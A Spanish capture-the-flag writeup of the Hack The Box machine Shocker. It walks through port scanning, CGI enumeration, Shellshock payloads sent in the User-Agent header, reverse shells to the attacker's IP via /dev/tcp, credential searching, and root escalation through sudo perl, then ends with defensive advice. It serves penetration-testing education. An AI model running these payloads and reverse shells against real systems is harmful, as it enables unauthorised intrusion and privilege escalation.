---
title: "hackthebox-shocker"
description: "Writeup paso a paso de la máquina Shocker de Hack The Box: reconocimiento, explotación Shellshock y escalada de privilegios hasta root."
date: "2026-01-05"
published: true
tags: ["hackthebox", "writeup", "shellshock", "linux", "web"]
readTime: "12 min"
---

# ✅ Hack The Box — Shocker (Paso a Paso)

Guía completa para resolver la máquina Shocker. Trabajaremos desde reconocimiento hasta la obtención de root, explotando la vulnerabilidad Shellshock en un CGI de Apache.

---

## 1) Preparación del entorno
- IP objetivo (HTB): `10.10.10.X`
- IP atacante: `10.10.14.Y`
- Herramientas: `nmap`, `gobuster`, `curl`, `nc`, `python`, `sudo`

---

## 2) Reconocimiento de puertos y servicios

```bash
nmap -sC -sV -oN nmap_initial 10.10.10.X
```

Resultados típicos:
- 22/tcp OpenSSH
- 80/tcp Apache con soporte CGI

Si el escaneo inicial es parco, profundiza:

```bash
nmap -p- --min-rate 5000 -oN nmap_all 10.10.10.X
nmap -sC -sV -p 22,80 -oN nmap_detail 10.10.10.X
```

---

## 3) Enumeración HTTP

```bash
whatweb http://10.10.10.X/
```

Bruteforce de rutas:

```bash
gobuster dir -u http://10.10.10.X/ -w /usr/share/wordlists/dirb/common.txt -x sh,php,txt,cgi
```

Objetivo: localizar `/cgi-bin/` y, dentro, algún script como `user.sh`.

---

## 4) Verificación de Shellshock

Shellshock afecta a Bash cuando se evalúan variables de entorno con funciones malformadas. Probamos enviando la carga en el header `User-Agent`:

```bash
curl -i -s -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "id"' \
  http://10.10.10.X/cgi-bin/user.sh
```

Si es vulnerable, verás la salida de `id` (por ejemplo `uid=33(www-data)`).

---

## 5) Reverse shell

Primero, escucha en tu máquina:

```bash
nc -lvnp 4444
```

Luego, lanza la reverse shell desde el header:

```bash
curl -i -s -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "bash -c bash -i >& /dev/tcp/10.10.14.Y/4444 0>&1"' \
  http://10.10.10.X/cgi-bin/user.sh
```

Si no funciona, prueba con variantes (URL-encoding o usando `/bin/sh`):

```bash
curl -i -s -H 'User-Agent: () { :; }; /bin/bash -c "exec /bin/sh -c \\"/bin/sh -i >& /dev/tcp/10.10.14.Y/4444 0>&1\\""' \
  http://10.10.10.X/cgi-bin/user.sh
```

---

## 6) Estabilizar la shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 50 cols 120
```

Explora el sistema:

```bash
whoami
uname -a
id
ls -la /home
```

---

## 7) Post-explotación y credenciales

Busca credenciales y archivos interesantes:

```bash
find / -type f -name "*.sh" -o -name "*.cgi" 2>/dev/null
grep -R "password" /var/www 2>/dev/null
cat /etc/passwd
```

Comprueba sudo:

```bash
sudo -l
```

En Shocker, es común que el usuario obtenido tenga permisos `NOPASSWD` sobre `perl` u otro binario. Si ves algo como:

```
(ALL) NOPASSWD: /usr/bin/perl
```

Puedes escalar a root con:

```bash
sudo perl -e 'exec "/bin/sh";'
```

Si el permiso está restringido a un script concreto, intenta abusar de rutas o argumentos permitidos (GTFOBins es útil).

---

## 8) Flags

```bash
cat /home/<usuario>/user.txt
cat /root/root.txt
```

Guarda los hashes/flags como evidencia.

---

## 9) Conclusiones y defensa
- La exposición de CGI con Bash vulnerable permite RCE vía Shellshock.
- Minimiza superficie: deshabilita CGI innecesarios, usa shells actualizadas.
- Aplica restricciones de `sudo` y revisa binarios con `NOPASSWD`.
- Monitoriza rutas como `/cgi-bin/` y cabeceras anómalas en logs.

---

## Comandos clave usados

```bash
nmap -sC -sV 10.10.10.X
gobuster dir -u http://10.10.10.X/ -w <wordlist> -x sh,cgi
curl -H 'User-Agent: () { :; }; ...' http://10.10.10.X/cgi-bin/user.sh
nc -lvnp 4444
python -c 'import pty; pty.spawn("/bin/bash")'
sudo perl -e 'exec "/bin/sh";'
```
¡Felicidades! Hemos completado la máquina.

## 📝 Conclusión

**Shocker** demuestra de forma clara cómo una mala configuración y software sin parches pueden derivar en un compromiso total del sistema. La exposición de **scripts CGI** ejecutados con una versión vulnerable de **Bash** permitió explotar **Shellshock** y obtener ejecución remota de comandos con extrema facilidad. A partir de ahí, una política de sudo laxa facilitó la escalada de privilegios hasta root en cuestión de minutos.
Este laboratorio refuerza la importancia de actualizar componentes críticos, reducir superficie de **ataque (CGI innecesarios)** y auditar permisos privilegiados, ya que una sola debilidad puede ser suficiente para comprometer toda la infraestructura.

¡Máquina shocker! 🚩